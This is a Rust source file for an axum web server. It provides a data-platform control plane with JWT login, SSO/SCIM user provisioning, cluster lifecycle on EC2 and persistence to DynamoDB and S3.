//! The axum HTTP server: serves the [`crate::ROUTES`] surface **and** the web SPA on one origin.
//!
//! Auth is local username/password (bcrypt-verified) issuing a session **JWT** — the break-glass
//! admin path from the plan; OIDC/SAML/SCIM layer on top of the same session-JWT seam later.
//! `/api/*` (except login) is gated by a Bearer-token middleware; the SPA is served same-origin so
//! the browser's `fetch('/api/...')` carries the token without CORS. Cluster lifecycle runs on an
//! in-memory store today (persistence via `weft-meta` is the next layer).

use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::{Arc, Mutex, RwLock};
use std::time::{SystemTime, UNIX_EPOCH};

use axum::extract::{Path, Request, State};
use axum::http::header::AUTHORIZATION;
use axum::http::StatusCode;
use axum::middleware::{from_fn_with_state, Next};
use axum::response::{IntoResponse, Response};
use axum::routing::{delete, get, post};
use axum::{Extension, Json, Router};
use jsonwebtoken::{decode, encode, DecodingKey, EncodingKey, Header, Validation};
use serde::{Deserialize, Serialize};
use tower_http::services::ServeDir;
use weft_clustermgr::Phase;
use weft_govern::{
    Effect, Evaluator, Grant, Identity, Ownership, Principal, Privilege, Securable, SecurableType,
};
use weft_loom::arrow::util::display::{ArrayFormatter, FormatOptions};
use weft_loom::Engine;

use crate::cloud;
use crate::cluster_client;
use crate::oidc::{self, OidcConfig, PendingStore, StoredOidc};
use crate::scim;
use openidconnect::core::CoreProviderMetadata;
use weft_catalog_glue::GlueCatalog;

// ─────────────────────────────────────────── Auth ───────────────────────────────────────────────

/// Session JWT claims.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Claims {
    /// Subject — the username.
    pub sub: String,
    /// The principal's groups (drives governance + UI).
    pub groups: Vec<String>,
    /// Expiry (unix seconds).
    pub exp: usize,
}

/// A local/federated user record. `password_hash` is empty for SSO/SCIM-sourced users so the local
/// bcrypt login path can never match them (bcrypt rejects an empty hash).
#[derive(Clone, Serialize, Deserialize)]
struct UserRecord {
    password_hash: String,
    groups: Vec<String>,
}

/// `POST /api/auth/login` body.
#[derive(Debug, Deserialize)]
pub struct LoginRequest {
    /// Username.
    pub username: String,
    /// Password.
    pub password: String,
}

/// `POST /api/auth/login` response.
#[derive(Debug, Serialize)]
pub struct LoginResponse {
    /// The bearer session token.
    pub token: String,
    /// The signed-in username.
    pub user: String,
    /// Resolved groups.
    pub groups: Vec<String>,
}

const TOKEN_TTL_SECS: usize = 24 * 60 * 60;

// ───────────────────────────────────────── Clusters ─────────────────────────────────────────────

/// A cluster as the API exposes it (mirrors the `clusters` table + the operator's status).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Cluster {
    /// Stable id.
    pub id: String,
    /// Display name.
    pub name: String,
    /// Lifecycle state (`PENDING`/`PROVISIONING`/`RUNNING`/…), from [`Phase::as_str`].
    pub state: String,
    /// Autoscale floor.
    pub worker_min: u32,
    /// Autoscale ceiling.
    pub worker_max: u32,
    /// Pod size class.
    pub worker_size: String,
    /// The cluster's real Spark Connect endpoint once `RUNNING` (e.g. `sc://host:51001`).
    #[serde(default)]
    pub connect_endpoint: Option<String>,
    /// Backing EC2 instance id (set for EC2-backed clusters) — persisted so the cluster can be
    /// re-adopted (deleted / auto-terminated) after a control-plane restart.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub instance_id: Option<String>,
}

/// One lifecycle event for a cluster (the reconcile trace the UI shows).
#[derive(Debug, Clone, Serialize)]
pub struct ClusterEvent {
    /// Unix seconds.
    pub at: u64,
    /// Human-readable message.
    pub message: String,
}

/// The real compute backing a `RUNNING` cluster: either a dedicated **EC2 instance** (production
/// path) or a local OS process (fallback for local/dev when no EC2 config is set).
enum ClusterRuntime {
    /// A `weft spark server` process on the control-plane node.
    Process(tokio::process::Child),
    /// A dedicated EC2 instance running `weft spark server`.
    Ec2 { instance_id: String },
}

/// Config for launching a real EC2 instance per cluster. Present (from env) → create-cluster spins
/// up an actual instance; absent → fall back to a local process.
#[derive(Clone)]
struct Ec2ClusterConfig {
    /// AMI for cluster instances.
    ami: String,
    /// Security group (must allow the Spark Connect port).
    sg: String,
    /// Optional subnet.
    subnet: Option<String>,
    /// Optional SSH key name.
    key: Option<String>,
    /// Public URL to download the `weft` binary onto the cluster instance.
    weft_url: String,
    /// AWS region.
    region: String,
    /// Path to the AWS CLI.
    aws_bin: String,
    /// Launch clusters in a private subnet with no public IP (reach them by private IP from the
    /// in-VPC gateway). Requires a route to S3 (gateway endpoint) + Glue for catalogs.
    private: bool,
    /// IAM instance profile to attach to cluster instances (e.g. so they can read Glue/S3).
    instance_profile: Option<String>,
}

impl Ec2ClusterConfig {
    /// Build from env; returns `None` (→ local-process clusters) unless the required vars are set:
    /// `WEFT_CLUSTER_AMI`, `WEFT_CLUSTER_SG`, `WEFT_CLUSTER_WEFT_URL`.
    fn from_env() -> Option<Self> {
        let ami = std::env::var("WEFT_CLUSTER_AMI").ok()?;
        let sg = std::env::var("WEFT_CLUSTER_SG").ok()?;
        let weft_url = std::env::var("WEFT_CLUSTER_WEFT_URL").ok()?;
        Some(Self {
            ami,
            sg,
            subnet: std::env::var("WEFT_CLUSTER_SUBNET").ok(),
            key: std::env::var("WEFT_CLUSTER_KEY").ok(),
            weft_url,
            region: std::env::var("AWS_REGION").unwrap_or_else(|_| "us-west-2".to_string()),
            aws_bin: std::env::var("WEFT_AWS_BIN").unwrap_or_else(|_| "aws".to_string()),
            private: std::env::var("WEFT_CLUSTER_PRIVATE")
                .map(|v| matches!(v.as_str(), "1" | "true" | "yes"))
                .unwrap_or(false),
            instance_profile: std::env::var("WEFT_CLUSTER_INSTANCE_PROFILE").ok(),
        })
    }
}

/// Map a cluster's `worker_size` to an EC2 instance type.
fn instance_type_for(size: &str) -> &'static str {
    match size {
        "small" => "t3.medium",
        "medium" => "t3.large",
        "large" => "c6a.xlarge",
        "xlarge" => "c6a.2xlarge",
        _ => "t3.medium",
    }
}

/// Body for `POST /api/clusters`.
#[derive(Debug, Deserialize)]
pub struct CreateCluster {
    /// Display name.
    pub name: String,
    /// Autoscale floor (default 1).
    #[serde(default = "one")]
    pub worker_min: u32,
    /// Autoscale ceiling (default 1).
    #[serde(default = "one")]
    pub worker_max: u32,
    /// Pod size class (default `small`).
    #[serde(default = "small")]
    pub worker_size: String,
}

fn one() -> u32 {
    1
}
fn small() -> String {
    "small".into()
}

// ─────────────────────────────────────────── State ──────────────────────────────────────────────

/// The shared application state. In-memory today; a `weft-meta` repository handle later. The
/// embedded [`Engine`] runs SQL in-process (the demo stand-in for routing to a cluster's Spark
/// Connect endpoint — same engine, real results).
#[derive(Clone)]
pub struct AppState {
    clusters: Arc<Mutex<HashMap<String, Cluster>>>,
    runtimes: Arc<tokio::sync::Mutex<HashMap<String, ClusterRuntime>>>,
    events: Arc<Mutex<HashMap<String, Vec<ClusterEvent>>>>,
    next_id: Arc<Mutex<u64>>,
    next_port: Arc<Mutex<u16>>,
    users: Arc<Mutex<HashMap<String, UserRecord>>>,
    groups: Arc<Mutex<HashMap<String, Vec<String>>>>,
    grants: Arc<Mutex<Vec<Grant>>>,
    connections: Arc<Mutex<Vec<ConnectionInfo>>>,
    /// Saved notebooks (the Workspace).
    notebooks: Arc<Mutex<Vec<NotebookDoc>>>,
    /// Saved SQL queries (the Workspace).
    queries: Arc<Mutex<Vec<SavedQuery>>>,
    /// DynamoDB table holding the `clusters` + `connections` collection blobs (durable, survives a
    /// control-plane restart/replacement). Workspace docs go to S3 instead.
    ddb_table: Arc<String>,
    /// S3 URIs for the workspace blobs (notebooks, saved queries).
    nb_uri: Arc<String>,
    q_uri: Arc<String>,
    engine: Arc<Engine>,
    jwt_secret: Arc<Vec<u8>>,
    web_dir: Arc<PathBuf>,
    weft_bin: Arc<String>,
    public_host: Arc<String>,
    ec2: Arc<Option<Ec2ClusterConfig>>,
    /// Last "use" time per cluster (unix secs) — drives idle auto-termination.
    last_activity: Arc<Mutex<HashMap<String, u64>>>,
    /// Seconds of inactivity before a running cluster is auto-terminated (0 = never).
    idle_secs: u64,
    /// External-IdP OIDC SSO config. Runtime-mutable by an admin (`/api/admin/sso`); `None` → SSO
    /// disabled. Seeded from env at startup, then overridden by the persisted DynamoDB blob if any.
    oidc: Arc<RwLock<Option<OidcConfig>>>,
    /// In-flight OIDC PKCE/state entries (keyed by the `state` handed to the IdP).
    oidc_pending: Arc<Mutex<PendingStore>>,
    /// Discovered OIDC provider metadata, cached after the first `/.well-known` fetch.
    oidc_meta: Arc<Mutex<Option<CoreProviderMetadata>>>,
    /// Static bearer token guarding `/scim/*` (from `WEFT_SCIM_TOKEN`). `None` → SCIM disabled.
    scim_token: Arc<Option<String>>,
}

impl AppState {
    /// Build state seeding a single local admin (`username`/`password`) and serving the SPA from
    /// `web_dir`. The JWT secret is provided by the caller (env in production).
    pub fn new(username: &str, password: &str, jwt_secret: Vec<u8>, web_dir: PathBuf) -> Self {
        Self::with_runtime(
            username,
            password,
            jwt_secret,
            web_dir,
            String::new(),
            "127.0.0.1".into(),
        )
    }

    /// Build state with cluster-runtime config: `weft_bin` (the `weft` binary spawned per cluster)
    /// and `public_host` (the address advertised in a cluster's Spark Connect endpoint).
    pub fn with_runtime(
        username: &str,
        password: &str,
        jwt_secret: Vec<u8>,
        web_dir: PathBuf,
        weft_bin: String,
        public_host: String,
    ) -> Self {
        let mut users = HashMap::new();
        let hash = bcrypt::hash(password, bcrypt::DEFAULT_COST).expect("bcrypt hash");
        users.insert(
            username.to_string(),
            UserRecord {
                password_hash: hash,
                groups: vec!["admins".to_string()],
            },
        );
        let mut groups = HashMap::new();
        groups.insert("admins".to_string(), vec![username.to_string()]);
        // The embedded engine holds no local/in-memory data. All tables come from attached
        // external catalogs (Glue), re-registered from DynamoDB in `load_from_cloud`.
        let engine = Arc::new(Engine::new());
        let ddb_table =
            std::env::var("WEFT_DDB_TABLE").unwrap_or_else(|_| "weft-control-plane".into());
        // Workspace S3 prefix (e.g. s3://bucket/control-plane); notebooks/queries are blobs under it.
        let ws_prefix = std::env::var("WEFT_WORKSPACE_S3")
            .unwrap_or_default()
            .trim_end_matches('/')
            .to_string();
        let nb_uri = format!("{ws_prefix}/notebooks.json");
        let q_uri = format!("{ws_prefix}/queries.json");
        let st = Self {
            clusters: Arc::new(Mutex::new(HashMap::new())),
            runtimes: Arc::new(tokio::sync::Mutex::new(HashMap::new())),
            events: Arc::new(Mutex::new(HashMap::new())),
            next_id: Arc::new(Mutex::new(0)),
            next_port: Arc::new(Mutex::new(51000)),
            users: Arc::new(Mutex::new(users)),
            groups: Arc::new(Mutex::new(groups)),
            grants: Arc::new(Mutex::new(Vec::new())),
            connections: Arc::new(Mutex::new(Vec::new())),
            notebooks: Arc::new(Mutex::new(Vec::new())),
            queries: Arc::new(Mutex::new(Vec::new())),
            ddb_table: Arc::new(ddb_table),
            nb_uri: Arc::new(nb_uri),
            q_uri: Arc::new(q_uri),
            engine,
            jwt_secret: Arc::new(jwt_secret),
            web_dir: Arc::new(web_dir),
            weft_bin: Arc::new(weft_bin),
            public_host: Arc::new(public_host),
            ec2: Arc::new(Ec2ClusterConfig::from_env()),
            last_activity: Arc::new(Mutex::new(HashMap::new())),
            idle_secs: std::env::var("WEFT_CLUSTER_IDLE_SECS")
                .ok()
                .and_then(|v| v.parse().ok())
                .unwrap_or(1800),
            oidc: Arc::new(RwLock::new(OidcConfig::from_env())),
            oidc_pending: Arc::new(Mutex::new(PendingStore::default())),
            oidc_meta: Arc::new(Mutex::new(None)),
            scim_token: Arc::new(
                std::env::var("WEFT_SCIM_TOKEN")
                    .ok()
                    .filter(|s| !s.is_empty()),
            ),
        };
        st
    }

    // ── SSO / SCIM accessors (let the `oidc`/`scim` modules reach private state) ──

    /// The runtime-mutable OIDC SSO config (`None` if SSO is disabled). Readers take a read lock and
    /// **clone** the config out before any `.await` (never hold the guard across an await point).
    pub(crate) fn oidc(&self) -> &Arc<RwLock<Option<OidcConfig>>> {
        &self.oidc
    }
    /// The in-flight OIDC PKCE/state store.
    pub(crate) fn oidc_pending(&self) -> &Arc<Mutex<PendingStore>> {
        &self.oidc_pending
    }
    /// The cached discovered provider metadata.
    pub(crate) fn oidc_meta(&self) -> &Arc<Mutex<Option<CoreProviderMetadata>>> {
        &self.oidc_meta
    }
    /// The SCIM bearer token (`None` if SCIM is disabled).
    pub(crate) fn scim_token(&self) -> &Arc<Option<String>> {
        &self.scim_token
    }

    /// Allocate a unique id with the given prefix (e.g. `nb-7`, `q-3`).
    fn new_oid(&self, prefix: &str) -> String {
        let mut n = self.next_id.lock().unwrap();
        *n += 1;
        format!("{prefix}-{n}")
    }

    /// Groups `user` belongs to, resolved from the server-side group store (the source of truth —
    /// never the JWT body). Used to build the governance identity for the SQL data path.
    pub(crate) fn groups_of(&self, user: &str) -> Vec<String> {
        self.groups
            .lock()
            .unwrap()
            .iter()
            .filter(|(_, members)| members.iter().any(|m| m == user))
            .map(|(g, _)| g.clone())
            .collect()
    }

    /// Whether `user` is an administrator (member of the `admins` group), resolved server-side.
    pub(crate) fn is_admin(&self, user: &str) -> bool {
        self.groups
            .lock()
            .unwrap()
            .get("admins")
            .is_some_and(|m| m.iter().any(|x| x == user))
    }

    /// Build a governance [`Evaluator`] from the current grant set. The bootstrap operator group
    /// `admins` owns the metastore (full access on the whole tree); every other principal is governed
    /// purely by explicit grants — i.e. fail-closed, sees nothing it wasn't granted.
    pub(crate) fn evaluator(&self) -> Evaluator {
        let grants = self.grants.lock().unwrap().clone();
        let owners = vec![Ownership {
            securable: Securable::metastore(),
            principal: Principal::Group("admins".into()),
        }];
        Evaluator::with_owners(grants, owners)
    }

    // Durable persistence (best-effort, off the request path). Workspace → S3; clusters +
    // connections → DynamoDB. Each collection is a single JSON blob; loads happen at startup.

    fn save_notebooks(&self) {
        let body = serde_json::to_string(&*self.notebooks.lock().unwrap()).unwrap_or_default();
        tokio::spawn(cloud::s3_put((*self.nb_uri).clone(), body));
    }

    fn save_queries(&self) {
        let body = serde_json::to_string(&*self.queries.lock().unwrap()).unwrap_or_default();
        tokio::spawn(cloud::s3_put((*self.q_uri).clone(), body));
    }

    fn save_connections(&self) {
        let body = serde_json::to_string(&*self.connections.lock().unwrap()).unwrap_or_default();
        tokio::spawn(cloud::ddb_put(
            (*self.ddb_table).clone(),
            "connections".into(),
            body,
        ));
    }

    /// Persist the user store (DynamoDB key `users`). Mirrors `save_connections`; best-effort,
    /// off the request path. Used by the SSO callback + SCIM provisioning.
    pub(crate) fn save_users(&self) {
        let snapshot: HashMap<String, UserRecord> = self.users.lock().unwrap().clone();
        let body = serde_json::to_string(&snapshot).unwrap_or_default();
        tokio::spawn(cloud::ddb_put((*self.ddb_table).clone(), "users".into(), body));
    }

    /// Persist the group store (DynamoDB key `groups`).
    pub(crate) fn save_groups(&self) {
        let body = serde_json::to_string(&*self.groups.lock().unwrap()).unwrap_or_default();
        tokio::spawn(cloud::ddb_put(
            (*self.ddb_table).clone(),
            "groups".into(),
            body,
        ));
    }

    /// Persist the current SSO config (DynamoDB key `sso`). Serializes the live [`OidcConfig`] as a
    /// [`StoredOidc`] blob (secret included — trusted control-plane state), or a disabled marker when
    /// SSO is off, so the disabled state survives restarts even with env vars still set.
    pub(crate) fn save_sso(&self) {
        let stored = match self.oidc.read().unwrap().as_ref() {
            Some(cfg) => StoredOidc::from(cfg),
            None => StoredOidc::disabled(),
        };
        let body = serde_json::to_string(&stored).unwrap_or_default();
        tokio::spawn(cloud::ddb_put((*self.ddb_table).clone(), "sso".into(), body));
    }

    // ── SSO / SCIM store mutations (shared by the `oidc` + `scim` modules) ──

    /// Add `user` to each named group's member list (idempotent).
    fn add_to_groups(groups: &mut HashMap<String, Vec<String>>, user: &str, names: &[String]) {
        for g in names {
            let members = groups.entry(g.clone()).or_default();
            if !members.iter().any(|m| m == user) {
                members.push(user.to_string());
            }
        }
    }

    /// Remove `user` from every group's member list.
    fn remove_from_all_groups(groups: &mut HashMap<String, Vec<String>>, user: &str) {
        for members in groups.values_mut() {
            members.retain(|m| m != user);
        }
    }

    /// Upsert an SSO/SCIM-federated user: empty password hash (local login can never match), set the
    /// user's groups to exactly `groups`, and reconcile the group store (add to new groups, drop from
    /// groups the user no longer belongs to). Returns nothing; caller persists.
    pub(crate) fn upsert_sso_user(&self, username: &str, groups: &[String]) {
        {
            let mut users = self.users.lock().unwrap();
            users.insert(
                username.to_string(),
                UserRecord {
                    password_hash: String::new(),
                    groups: groups.to_vec(),
                },
            );
        }
        let mut g = self.groups.lock().unwrap();
        // Drop from groups not in the new set, then add to the new set.
        for (name, members) in g.iter_mut() {
            if !groups.iter().any(|x| x == name) {
                members.retain(|m| m != username);
            }
        }
        Self::add_to_groups(&mut g, username, groups);
    }

    /// SCIM: create/replace a user with exactly `groups`. (Same reconcile as [`Self::upsert_sso_user`].)
    pub(crate) fn scim_upsert_user(&self, username: &str, groups: &[String]) {
        self.upsert_sso_user(username, groups);
    }

    /// SCIM: the user's groups, or `None` if no such user.
    pub(crate) fn scim_get_user(&self, username: &str) -> Option<Vec<String>> {
        self.users.lock().unwrap().get(username).map(|u| u.groups.clone())
    }

    /// SCIM: all users as `(username, groups)`, sorted by username.
    pub(crate) fn scim_list_users(&self) -> Vec<(String, Vec<String>)> {
        let users = self.users.lock().unwrap();
        let mut out: Vec<(String, Vec<String>)> =
            users.iter().map(|(u, r)| (u.clone(), r.groups.clone())).collect();
        out.sort_by(|a, b| a.0.cmp(&b.0));
        out
    }

    /// SCIM: delete a user and drop it from every group. Returns whether it existed.
    pub(crate) fn scim_delete_user(&self, username: &str) -> bool {
        let existed = self.users.lock().unwrap().remove(username).is_some();
        if existed {
            Self::remove_from_all_groups(&mut self.groups.lock().unwrap(), username);
        }
        existed
    }

    /// SCIM: create/replace a group's membership (and reflect it into each member's `groups`).
    pub(crate) fn scim_set_group(&self, name: &str, members: Vec<String>) {
        self.groups.lock().unwrap().insert(name.to_string(), members.clone());
        // Reflect membership into the user records: add for members, remove for non-members.
        let mut users = self.users.lock().unwrap();
        for (uname, rec) in users.iter_mut() {
            let should = members.iter().any(|m| m == uname);
            let has = rec.groups.iter().any(|g| g == name);
            if should && !has {
                rec.groups.push(name.to_string());
            } else if !should && has {
                rec.groups.retain(|g| g != name);
            }
        }
    }

    /// SCIM: a group's members, or `None` if no such group.
    pub(crate) fn scim_get_group(&self, name: &str) -> Option<Vec<String>> {
        self.groups.lock().unwrap().get(name).cloned()
    }

    /// SCIM: all groups as `(name, members)`, sorted by name.
    pub(crate) fn scim_list_groups(&self) -> Vec<(String, Vec<String>)> {
        let groups = self.groups.lock().unwrap();
        let mut out: Vec<(String, Vec<String>)> =
            groups.iter().map(|(n, m)| (n.clone(), m.clone())).collect();
        out.sort_by(|a, b| a.0.cmp(&b.0));
        out
    }

    /// SCIM: delete a group (and strip it from each user's `groups`). Returns whether it existed.
    pub(crate) fn scim_delete_group(&self, name: &str) -> bool {
        let existed = self.groups.lock().unwrap().remove(name).is_some();
        if existed {
            for rec in self.users.lock().unwrap().values_mut() {
                rec.groups.retain(|g| g != name);
            }
        }
        existed
    }

    fn save_clusters(&self) {
        let snapshot: Vec<Cluster> = self.clusters.lock().unwrap().values().cloned().collect();
        let body = serde_json::to_string(&snapshot).unwrap_or_default();
        tokio::spawn(cloud::ddb_put(
            (*self.ddb_table).clone(),
            "clusters".into(),
            body,
        ));
    }

    /// Load all durable state at startup (called from `serve`, async): connections (re-register
    /// their catalogs), workspace docs, and clusters (re-adopt EC2 instances; mark dead local ones).
    async fn load_from_cloud(&self) {
        // Connections (DynamoDB) → re-register each provider into the engine.
        if let Some(body) = cloud::ddb_get(&self.ddb_table, "connections").await {
            if let Ok(saved) = serde_json::from_str::<Vec<ConnectionInfo>>(&body) {
                for c in saved {
                    match build_connection_provider(&c.kind, &c.name, &c.options) {
                        Ok(p) => {
                            self.engine.register_catalog(&c.name, p);
                            self.connections.lock().unwrap().push(c);
                        }
                        Err(e) => eprintln!("warn: skipping connection `{}`: {e}", c.name),
                    }
                }
            }
        }
        // Workspace (S3).
        if let Some(body) = cloud::s3_get(&self.nb_uri).await {
            if let Ok(v) = serde_json::from_str::<Vec<NotebookDoc>>(&body) {
                *self.notebooks.lock().unwrap() = v;
            }
        }
        if let Some(body) = cloud::s3_get(&self.q_uri).await {
            if let Ok(v) = serde_json::from_str::<Vec<SavedQuery>>(&body) {
                *self.queries.lock().unwrap() = v;
            }
        }
        // Clusters (DynamoDB) → re-adopt so the idle reaper + delete can manage them again.
        if let Some(body) = cloud::ddb_get(&self.ddb_table, "clusters").await {
            if let Ok(saved) = serde_json::from_str::<Vec<Cluster>>(&body) {
                self.adopt_clusters(saved).await;
            }
        }
        // Users + groups (DynamoDB) → SSO/SCIM-provisioned directory. Merged *over* the seeded
        // break-glass admin (loaded entries win for their keys, but the admin is never dropped).
        if let Some(body) = cloud::ddb_get(&self.ddb_table, "users").await {
            if let Ok(saved) = serde_json::from_str::<HashMap<String, UserRecord>>(&body) {
                let mut users = self.users.lock().unwrap();
                for (k, v) in saved {
                    users.insert(k, v);
                }
            }
        }
        if let Some(body) = cloud::ddb_get(&self.ddb_table, "groups").await {
            if let Ok(saved) = serde_json::from_str::<HashMap<String, Vec<String>>>(&body) {
                let mut groups = self.groups.lock().unwrap();
                for (k, v) in saved {
                    groups.insert(k, v);
                }
            }
        }
        // SSO config (DynamoDB key `sso`). If present it wins over the env seed (so an admin's
        // runtime change — including an explicit *disable* — persists across restarts). Absent →
        // keep whatever `from_env` seeded at construction (disabled in prod, where env is removed).
        if let Some(body) = cloud::ddb_get(&self.ddb_table, "sso").await {
            if let Ok(stored) = serde_json::from_str::<StoredOidc>(&body) {
                *self.oidc.write().unwrap() = stored.into_config();
            }
        }
    }

    /// Re-adopt persisted clusters after a restart. EC2-backed clusters get their runtime handle
    /// rebuilt from the stored `instance_id` (so delete/auto-terminate work again) and a fresh idle
    /// window; local-process clusters can't survive a restart, so they're marked `STOPPED`.
    async fn adopt_clusters(&self, saved: Vec<Cluster>) {
        for mut c in saved {
            match c.instance_id.clone() {
                Some(instance_id) => {
                    self.runtimes
                        .lock()
                        .await
                        .insert(c.id.clone(), ClusterRuntime::Ec2 { instance_id });
                    self.touch(&c.id); // fresh idle window so the reaper doesn't kill it instantly
                }
                None => {
                    // A local-process cluster can't survive a control-plane restart.
                    if c.state == Phase::Running.as_str() || c.state == Phase::Provisioning.as_str()
                    {
                        c.state = Phase::Terminated.as_str().to_string();
                        c.connect_endpoint = None;
                    }
                }
            }
            self.clusters.lock().unwrap().insert(c.id.clone(), c);
        }
    }

    /// Mark a cluster as just-used (resets its idle timer).
    fn touch(&self, id: &str) {
        self.last_activity
            .lock()
            .unwrap()
            .insert(id.to_string(), now_secs() as u64);
    }

    fn add_event(&self, id: &str, message: impl Into<String>) {
        let at = now_secs() as u64;
        self.events
            .lock()
            .unwrap()
            .entry(id.to_string())
            .or_default()
            .push(ClusterEvent {
                at,
                message: message.into(),
            });
    }

    fn set_state(&self, id: &str, state: Phase, endpoint: Option<String>) {
        let changed = {
            let mut clusters = self.clusters.lock().unwrap();
            if let Some(c) = clusters.get_mut(id) {
                c.state = state.as_str().to_string();
                if endpoint.is_some() {
                    c.connect_endpoint = endpoint;
                }
                true
            } else {
                false
            }
        };
        if changed {
            self.save_clusters();
        }
    }

    /// Record the EC2 instance backing a cluster (so it can be re-adopted after a restart).
    fn set_cluster_instance(&self, id: &str, instance_id: &str) {
        if let Some(c) = self.clusters.lock().unwrap().get_mut(id) {
            c.instance_id = Some(instance_id.to_string());
        }
        self.save_clusters();
    }

    fn alloc_port(&self) -> u16 {
        let mut p = self.next_port.lock().unwrap();
        let port = *p;
        *p += 1;
        port
    }

    fn new_id(&self) -> String {
        let mut n = self.next_id.lock().unwrap();
        *n += 1;
        format!("cluster-{n}")
    }

    pub(crate) fn issue_token(&self, user: &str, groups: &[String]) -> Option<String> {
        let exp = now_secs() + TOKEN_TTL_SECS;
        let claims = Claims {
            sub: user.to_string(),
            groups: groups.to_vec(),
            exp,
        };
        encode(
            &Header::default(),
            &claims,
            &EncodingKey::from_secret(&self.jwt_secret),
        )
        .ok()
    }

    fn verify_token(&self, token: &str) -> Option<Claims> {
        decode::<Claims>(
            token,
            &DecodingKey::from_secret(&self.jwt_secret),
            &Validation::default(),
        )
        .ok()
        .map(|d| d.claims)
    }
}

fn now_secs() -> usize {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs() as usize
}

/// Current time as an ISO-8601 UTC string (e.g. `2026-06-25T14:40:00Z`) — what the web renders for
/// `updatedAt`. Computed from unix seconds (civil-from-days) so we avoid a date-library dependency.
fn now_iso() -> String {
    let secs = now_secs() as i64;
    let (days, rem) = (secs.div_euclid(86400), secs.rem_euclid(86400));
    let (h, mi, s) = (rem / 3600, (rem % 3600) / 60, rem % 60);
    // Howard Hinnant's civil_from_days.
    let z = days + 719468;
    let era = if z >= 0 { z } else { z - 146096 } / 146097;
    let doe = z - era * 146097;
    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
    let y = yoe + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = if m <= 2 { y + 1 } else { y };
    format!("{y:04}-{m:02}-{d:02}T{h:02}:{mi:02}:{s:02}Z")
}

// ─────────────────────────────────────────── Router ─────────────────────────────────────────────

/// Build the gateway router: public auth + health, Bearer-gated `/api/*`, and the SPA fallback.
pub fn app(state: AppState) -> Router {
    let protected = Router::new()
        .route("/api/me", get(me))
        .route("/api/clusters", get(list_clusters).post(create_cluster))
        .route("/api/clusters/:id", get(get_cluster).delete(delete_cluster))
        .route("/api/clusters/:id/start", post(start_cluster))
        .route("/api/clusters/:id/stop", post(stop_cluster))
        .route("/api/clusters/:id/events", get(list_cluster_events))
        .route("/api/sql", post(run_sql))
        .route("/api/catalog", get(get_catalog))
        .route(
            "/api/connections",
            get(list_connections).post(create_connection),
        )
        .route("/api/connections/:name", delete(delete_connection))
        // Workspace: notebooks + saved SQL queries
        .route("/api/notebooks", get(list_notebooks).post(create_notebook))
        .route(
            "/api/notebooks/:id",
            get(get_notebook).put(save_notebook).delete(delete_notebook),
        )
        .route("/api/queries", get(list_queries).post(create_query))
        .route(
            "/api/queries/:id",
            get(get_query).put(save_query).delete(delete_query),
        )
        .route("/api/admin/users", get(list_users).post(create_user))
        .route("/api/admin/groups", get(list_groups).post(create_group))
        .route(
            "/api/admin/sso",
            get(oidc::get_sso).put(oidc::put_sso).delete(oidc::delete_sso),
        )
        .route(
            "/api/grants",
            get(list_grants).post(create_grant).delete(revoke_grant),
        )
        .route_layer(from_fn_with_state(state.clone(), auth_mw));

    // SCIM 2.0 provisioning surface, guarded by a static bearer token (WEFT_SCIM_TOKEN).
    let scim_routes = Router::new()
        .route(
            "/scim/v2/Users",
            get(scim::list_users).post(scim::create_user),
        )
        .route(
            "/scim/v2/Users/:id",
            get(scim::get_user)
                .put(scim::put_user)
                .patch(scim::patch_user)
                .delete(scim::delete_user),
        )
        .route(
            "/scim/v2/Groups",
            get(scim::list_groups).post(scim::create_group),
        )
        .route(
            "/scim/v2/Groups/:id",
            get(scim::get_group)
                .put(scim::put_group)
                .patch(scim::patch_group)
                .delete(scim::delete_group),
        )
        .route_layer(from_fn_with_state(state.clone(), scim::scim_guard));

    // SPA: serve hashed assets directly; any other path (`/`, `/admin`, `/sql`, refreshes, deep
    // links) returns index.html so the client-side router takes over. This is the robust SPA
    // pattern — a plain ServeDir 404s on client routes.
    let assets = ServeDir::new(state.web_dir.join("assets"));

    Router::new()
        .route("/healthz", get(healthz))
        .route("/api/auth/login", post(login))
        .route("/api/auth/logout", post(logout))
        // External-IdP OIDC SSO — all PUBLIC (no Bearer), same group as local login.
        .route("/api/auth/sso/login", get(oidc::sso_login))
        .route("/api/auth/callback", get(oidc::callback))
        .route("/api/auth/config", get(oidc::auth_config))
        .merge(protected)
        .merge(scim_routes)
        .nest_service("/assets", assets)
        .fallback(spa_index)
        .with_state(state)
}

/// Serve `index.html` for any unmatched path (the SPA entry; client-side routing handles the rest).
async fn spa_index(State(st): State<AppState>) -> Response {
    match tokio::fs::read(st.web_dir.join("index.html")).await {
        Ok(bytes) => (
            [(axum::http::header::CONTENT_TYPE, "text/html; charset=utf-8")],
            bytes,
        )
            .into_response(),
        Err(_) => (StatusCode::NOT_FOUND, "web UI not built").into_response(),
    }
}

async fn healthz() -> &'static str {
    "ok"
}

/// Bearer-token gate for `/api/*` (except login). On success the [`Claims`] are inserted as a
/// request extension for downstream handlers.
async fn auth_mw(
    State(st): State<AppState>,
    mut req: Request,
    next: Next,
) -> Result<Response, StatusCode> {
    let token = req
        .headers()
        .get(AUTHORIZATION)
        .and_then(|v| v.to_str().ok())
        .and_then(|v| v.strip_prefix("Bearer "))
        .ok_or(StatusCode::UNAUTHORIZED)?;
    let claims = st.verify_token(token).ok_or(StatusCode::UNAUTHORIZED)?;
    req.extensions_mut().insert(claims);
    Ok(next.run(req).await)
}

async fn login(
    State(st): State<AppState>,
    Json(body): Json<LoginRequest>,
) -> Result<Json<LoginResponse>, StatusCode> {
    let (hash, groups) = {
        let users = st.users.lock().unwrap();
        let u = users.get(&body.username).ok_or(StatusCode::UNAUTHORIZED)?;
        (u.password_hash.clone(), u.groups.clone())
    };
    if !bcrypt::verify(&body.password, &hash).unwrap_or(false) {
        return Err(StatusCode::UNAUTHORIZED);
    }
    let token = st
        .issue_token(&body.username, &groups)
        .ok_or(StatusCode::INTERNAL_SERVER_ERROR)?;
    Ok(Json(LoginResponse {
        token,
        user: body.username,
        groups,
    }))
}

